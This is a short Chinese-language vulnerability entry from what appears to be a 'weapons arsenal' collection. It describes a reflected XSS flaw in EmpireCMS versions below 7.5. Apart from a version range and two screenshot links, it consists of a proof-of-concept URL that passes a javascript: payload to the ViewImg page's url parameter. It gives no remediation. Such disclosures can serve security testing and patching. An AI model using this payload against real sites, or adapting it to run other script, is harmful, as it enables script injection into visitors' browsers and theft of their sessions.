---
title: 'EmpireCMS 全版本XSS漏洞'
date: Sat, 05 Sep 2020 13:16:35 +0000
draft: false
tags: ['白阁-武器库']
---

### 漏洞范围

EmpireCMS 全版本 <7.5

### 漏洞POC

```
http://*******/e/ViewImg/index.html?url=javascript:alert(/xss/)
```

![](EmpireCMS%20%E5%85%A8%E7%89%88%E6%9C%ACXSS%E6%BC%8F%E6%B4%9E/K52GS8VKPFJ7RHL7J1.png) ![](EmpireCMS%20%E5%85%A8%E7%89%88%E6%9C%ACXSS%E6%BC%8F%E6%B4%9E/PWG@XY7ATDZ@YR.png)